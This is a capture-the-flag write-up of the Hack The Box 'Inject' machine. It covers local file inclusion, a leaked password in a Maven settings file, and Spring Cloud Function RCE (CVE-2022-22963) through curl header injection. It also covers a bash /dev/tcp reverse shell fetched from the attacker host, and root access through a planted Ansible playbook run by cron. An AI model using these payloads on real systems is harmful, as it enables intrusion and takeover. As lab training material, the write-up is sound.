---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/inject/","tags":["#linux","web"],"dg-note-properties":{"Difficulty":"easy","tags":["#linux","web"]}}
---


# 10.10.11.204
---
# Enumeration &  Recon

as always start with an nmap scan

```bash
nmap -sV 10.10.11.204  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:11 EDT  
Nmap scan report for 10.10.11.204  
Host is up (0.16s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT     STATE SERVICE     VERSION  
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
8080/tcp open  nagios-nsca Nagios NSCA  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 25.59 seconds
```

ssh and a web server

### 8080

![Pasted image 20230312134445.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312134445.png)  
looks like a static site for the most part. login doesn't work, signup is under construction. could be a dev version of the site running like agile?

there is a working file upload page, but it only takes images.  
I tried bypassing the file upload through numerous means like extension stacking, file header "injection", exif injection, but nothing worked.  
However, I noticed on uploading my exif injected image that there was an img path parameter.  
testing for lfi resulted in success after continually adding parent folders.  
![Pasted image 20230312135025.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312135025.png)  
![Pasted image 20230312135055.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312135055.png)

looks like there could be something here, I'll try the request in burp.  
![Pasted image 20230312135226.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312135226.png)  
cool, now we have some users.

- frank
    
- phil
    
    - `phil:DocPhillovestoInject123`

folders are technically files in linux, so I wondered if I could just see the directory listings, considering this is an "easy" box

![Pasted image 20230312135449.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312135449.png)  
yep

definitely went on a rabbit hole with the revshell upload. dammit.

lets look at frank first, could probably find an ssh key to log in since they ssh up

hmm... no .ssh dir, nothing interesting in .bashrc or history...  
only thing weird is the .m2 directory, idk what this is but there's a settings.xml in it  
![Pasted image 20230312135934.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312135934.png)  
now we're talking

so it seems to be a maven webapp, guess that's why nmap returned the service being nagios

lets look at phill, must be an ssh key in there based on those settings  
![Pasted image 20230312140156.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312140156.png)  
well there's the user.txt but no .ssh dir and I guess bad permissions to open the user flag.

guess we can try to log in with phil's passwd anyways  
ok well the password isn't working over ssh. could be configured to key only, but we don't have a key directory so wtf.

guess we can get more details about the webapp

browsing the usual web dir I found the maven "pom" which is the "project object model"  
![Pasted image 20230312140831.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312140831.png)

seems to be spring framework?

- spring-boot 2.6.5
    - no vulns
- spring-framework butt function web 3.2.2
    - https://sysdig.com/blog/cve-2022-22963-spring-butt/  
        looks like a crit vulnerability. RCE too, perfect.

```bash
curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.butt.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
```

time to fire it and try it out

# Exploitation i.e getting a foothold

getting some errors, maybe there's another exploit

[this](https://github.com/me2nuk/CVE-2022-22963) looks cleaner:

```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.butt.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
```

![Pasted image 20230312142413.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312142413.png)  
looks like /tmp/pwned was created, and I should be able to catch a shell.

we're going to have to upload it first, so let's take a oneliner from [payloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp):  
`bash -i >& /dev/tcp/$ATT_IP/$ATT_PORT 0>&1`  
and put that in our shell script  
then use the exploit above to grab it

```bash
curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.butt.function.routing-exp  
ression:T(java.lang.Runtime).getRuntime().exec("curl $ATT_IP:$ATT_PORT/ntcrwlr.sh -o /tmp/brumbo")'  
--data-raw 'data' -v
```

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.10.11.204 - - [12/Mar/2023 14:45:55] "GET /ntcrwlr.sh HTTP/1.1" 200 -

```

looks good so far

![Pasted image 20230312145134.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230312145134.png)

ok lets try catching it

```bash
nc -nvlp 44451
```

listener up, firing the payload

```bash
curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.butt.function.routing-exp  
ression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/brumbo")' --data-raw 'data' -v
```

```bash
Connection from 10.10.11.204:46074  
bash: cannot set terminal process group (819): Inappropriate ioctl for device  
bash: no job control in this shell  
frank@inject:/$
```

there we go.


# Post Exploitation i.e. privsec
first I'll upgrade the shell with the usual:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

ctrl+z

```bash
stty raw -echo; fg
```

next I need to try switching to phil cause we don't know frank's password.

perfect:

```bash
frank@inject:/$ su phil  
su phil  
Password: DocPhillovestoInject123  
  
phil@inject:/$
```

and the user flag is in phil's home dir.

it seems phil can't run sudo.  
maybe he is in a privileged group?

```bash
phil@inject:/$ find / -group staff
--- SNIP ---
/opt/automation/tasks  
/root
```

and also a bunch of local python stuff

`/opt/automation/tasks` has an [ansible playbook](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html) which has a built in module that can let us run shell commands. Given the name of the dir, it's likely that root is running some regular job of this playbook. maybe we can give it another playbook to run.

I could probably move the root.txt file to phil's home, but I want to get root access. the simplest way I can think of is to spawn another reverse shell for root. Maybe there's another one, but at least I won't have to refresh and monitor.

I'll modify the `playbook_1.yml` to do this and then upload it as another `playbook_2.yml`.

```yml
- name: "brumbo"
  hosts: localhost
  tasks:
    - name: "ntcrwlr"
      shell: bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'

```

while hosting a local python http.server, wget on phil:

```bash
phil@inject:/opt/automation/tasks$ wget http://$ATT_IP/playbook_2.yml  
wget http://10.10.16.2/playbook_2.yml  
--2023-03-12 20:11:15--  http://10.10.16.2/playbook_2.yml  
Connecting to 10.10.16.2:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 132 [application/octet-stream]  
Saving to: ‘playbook_2.yml’  
  
playbook_2.yml      100%[===================>]     132  --.-KB/s    in 0s  
  
2023-03-12 20:11:15 (9.84 MB/s) - ‘playbook_2.yml’ saved [132/132]
```

```bash
nc -nvlp 4451  
Connection from 10.10.11.204:34354  
bash: cannot set terminal process group (92883): Inappropriate ioctl for device  
bash: no job control in this shell  
root@inject:/opt/automation/tasks#
```
### Post-Exploitation Rumination 
looking at the crontab in ``/var/spool/cron/crontabs/root`:

```
*/2 * * * * /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
*/2 * * * * sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
*/2 * * * * /usr/bin/rm -rf /var/www/WebApp/src/main/uploads/*
*/5 * * * * /usr/bin/rm -rf /tmp/*.yml /dev/shm/*.yml
```

it looks like it's running the ansible-parallel for every playbook in `/opt/automation/tasks`, then removes the jobs and puts the default one in.  
it then removes any uploads and any playbooks in tmp and /dev/shm.